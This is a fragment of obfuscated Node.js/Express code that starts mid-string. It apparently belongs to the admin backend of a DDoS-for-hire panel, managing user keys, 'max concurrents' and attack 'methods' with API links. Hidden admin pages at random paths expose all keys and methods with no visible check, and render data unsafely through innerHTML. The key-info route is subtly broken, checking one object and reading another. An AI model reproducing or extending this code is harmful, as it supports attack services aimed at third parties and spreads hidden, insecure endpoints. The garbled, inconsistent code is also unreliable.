x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20bold;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x205px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20input,\x20select\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#777777;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x205px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20button\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#555555;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x205px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20cursor:\x20pointer;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20button:hover\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#444444;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20#userInfo\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-top:\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#777777;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x205px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<form\x20action=\x22/xxz1\x22\x20method=\x22POST\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<label\x20for=\x22selectedUser\x22>x112\x202</label>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<select\x20id=\x22selectedUser\x22\x20name=\x22selectedUser\x22\x20required\x20onchange=\x22showUserInfo()\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+_0x28bc04+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</select>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20id=\x22userInfo\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</form>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20function\x20showUserInfo()\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20selectedUser\x20=\x20document.getElementById(\x27selectedUser\x27).value;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20userInfoDiv\x20=\x20document.getElementById(\x27userInfo\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20user\x20=\x20'+JSON[_0x29dd6f(0x158)](_0x399f7c)+_0x29dd6f(0x147);_0x3fc8cf[_0x29dd6f(0x146)](0xc8)[_0x29dd6f(0x152)](_0x320692);}));function _0x29c5(){const _0x24cbfb=['get','status',';\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20userInfoHTML\x20=\x20\x27<br>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<label\x20for=\x22key\x22>Key:\x20\x27\x20+\x20selectedUser\x20+\x20\x27</label><br>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<label\x20for=\x22user\x22>User:\x20\x27\x20+\x20user[selectedUser].user\x20+\x20\x27</label><br>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<label\x20for=\x22time\x22>Time:\x20\x27\x20+\x20user[selectedUser].time\x20+\x20\x27</label><br>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<label\x20for=\x22expiry\x22>Expiry:\x20\x27\x20+\x20user[selectedUser].expiry\x20+\x20\x27</label><br>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<label\x20for=\x22maxCons\x22>Max\x20Concurrents:\x20\x27\x20+\x20user[selectedUser].maxCons\x20+\x20\x27</label><br>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<label\x20for=\x22banned\x22>Banned:\x20\x27\x20+\x20user[selectedUser].banned\x20+\x20\x27</label><br>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<label\x20for=\x22vip\x22>VIP:\x20\x27\x20+\x20user[selectedUser].vip\x20+\x20\x27</label><br>\x27;\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20userInfoDiv.innerHTML\x20=\x20userInfoHTML;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20</script>\x0a\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20</html>\x0a\x20\x20','1449pWxBRC','355512rWEszz','keys','join','parse','</option>','191248PSSJMY','<option\x20value=\x22','3dzSvGD','map','send','1023491JQaILX','1096110RABADZ','readFileSync','6cSQGIp','/9zx22/009kz1/x77c8x/99xm11/99xxa1223/9x112xx1/101012xss/229191x/0119x','stringify','9325930jPUOEq','7792HkaCsQ','35366VIBRfm'];_0x29c5=function(){return _0x24cbfb;};return _0x29c5();}

// Absolute Vuln Remover 2
function _0x3122(_0x1d3fe5,_0x12f811){const _0x442450=_0x4424();return _0x3122=function(_0x312296,_0x3752e3){_0x312296=_0x312296-0x11b;let _0x3708c6=_0x442450[_0x312296];return _0x3708c6;},_0x3122(_0x1d3fe5,_0x12f811);}function _0x4424(){const _0x39d576=['<option\x20value=\x22','44512gxWzyU','send','readFileSync','2ZrEPku','36GEgzlI','parse','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</select>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20id=\x22methodInfo\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20id=\x22formattedApiList\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</form>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20function\x20showMethodInfo()\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20selectedMethod\x20=\x20document.getElementById(\x27selectedMethod\x27).value;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20methodInfoDiv\x20=\x20document.getElementById(\x27methodInfo\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20formattedApiListDiv\x20=\x20document.getElementById(\x27formattedApiList\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20method\x20=\x20','get','keys','296451nmjkvS','status','1686256Ripydm','24LOkoCC','\x0a\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Edit\x20Method\x20Form</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#151414;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-content:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x20100vh;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#343232;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20form\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#343232;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x205px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20flex-direction:\x20column;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20label\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20bold;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x205px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20input,\x20select\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#777777;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x205px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20button\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#555555;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x205px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20cursor:\x20pointer;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20button:hover\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#444444;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20#methodInfo\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-top:\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#777777;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x205px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20#formattedApiList\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-top:\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#777777;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x205px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<form\x20action=\x22/editmethod\x22\x20method=\x22POST\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<label\x20for=\x22selectedMethod\x22>Выборы\x20Ты</label>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<select\x20id=\x22selectedMethod\x22\x20name=\x22selectedMethod\x22\x20required\x20onchange=\x22showMethodInfo()\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','10rYhcTR','679511ogUxuQ',';\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20methodInfoHTML\x20=\x20\x27<br>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<label\x20for=\x22slots\x22>Slots:\x20\x27\x20+\x20method[selectedMethod].slots\x20+\x20\x27</label><br>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<label\x20for=\x22network\x22>Network:\x20\x27\x20+\x20method[selectedMethod].network\x20+\x20\x27</label><br>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<label\x20for=\x22maxtime\x22>Max\x20Time:\x20\x27\x20+\x20method[selectedMethod].maxtime\x20+\x20\x27</label><br>\x27;\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20methodInfoDiv.innerHTML\x20=\x20methodInfoHTML;\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20//\x20Membuat\x20daftar\x20link\x20dengan\x20format\x20yang\x20diinginkan\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20formattedApiList\x20=\x20method[selectedMethod].api.map((link,\x20index)\x20=>\x20`-\x20Link\x20${index\x20+\x201}:\x20${link}`).join(\x27<br>\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20formattedApiListHTML\x20=\x20\x27<br><label\x20for=\x22links\x22>Links:\x20<br>\x27\x20+\x20formattedApiList\x20+\x20\x27</label><br>\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20formattedApiListDiv.innerHTML\x20=\x20formattedApiListHTML;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20','stringify','424787AdohHt','error','171215pqyaLy','2250243ImzWQu','</option>','6STtHLK','/9zx22/009kz1/x77c8x/99xm111'];_0x4424=function(){return _0x39d576;};return _0x4424();}const _0x1f1a76=_0x3122;(function(_0x3460ea,_0x45db7f){const _0x472d22=_0x3122,_0x588dc6=_0x3460ea();while(!![]){try{const _0x55c4d0=-parseInt(_0x472d22(0x12f))/0x1+parseInt(_0x472d22(0x132))/0x2*(-parseInt(_0x472d22(0x11e))/0x3)+parseInt(_0x472d22(0x121))/0x4*(-parseInt(_0x472d22(0x129))/0x5)+-parseInt(_0x472d22(0x12c))/0x6*(parseInt(_0x472d22(0x124))/0x7)+parseInt(_0x472d22(0x120))/0x8+parseInt(_0x472d22(0x12a))/0x9*(parseInt(_0x472d22(0x123))/0xa)+-parseInt(_0x472d22(0x127))/0xb*(-parseInt(_0x472d22(0x133))/0xc);if(_0x55c4d0===_0x45db7f)break;else _0x588dc6['push'](_0x588dc6['shift']());}catch(_0x3e4e5f){_0x588dc6['push'](_0x588dc6['shift']());}}}(_0x4424,0x1fef0),app[_0x1f1a76(0x11c)](_0x1f1a76(0x12d),(_0x3f44d6,_0x58e184)=>{const _0x4ea302=_0x1f1a76;try{const _0x23de21=fs[_0x4ea302(0x131)](methodsFilePath),_0x17b54d=JSON[_0x4ea302(0x134)](_0x23de21),_0x32fff3=Object[_0x4ea302(0x11d)](_0x17b54d),_0x28fe20=_0x32fff3['map'](_0x2889f0=>_0x4ea302(0x12e)+_0x2889f0+'\x22>'+_0x2889f0+_0x4ea302(0x12b))['join'](''),_0xfdbde5=_0x4ea302(0x122)+_0x28fe20+_0x4ea302(0x11b)+JSON[_0x4ea302(0x126)](_0x17b54d)+_0x4ea302(0x125);_0x58e184[_0x4ea302(0x11f)](0xc8)[_0x4ea302(0x130)](_0xfdbde5);}catch(_0x2c32c2){console[_0x4ea302(0x128)](_0x2c32c2),_0x58e184[_0x4ea302(0x11f)](0x1f4)[_0x4ea302(0x130)]('Internal\x20Server\x20Error');}}));


app.get("/api/key_info", (req, res) => {

  let key = req.query.key;

  if (!key) return res.json({ error: true, message: "Invalid API key" });

  if (key) {
    if (keyData[key]) {
      res.json({ error: false, username: keys[key].user, expiry: keys[key].expiry, max_cons: keys[key].maxCons, vip: keys[key].vip, priv: keys[key].priv });

    } else {
      return res.status(401).json({ error: true, message: "Invalid API key" });
    }
  } else {
    return res.status(400).json({ error: true, message: "Please provide a key" });
  }
});



module.exports = { router };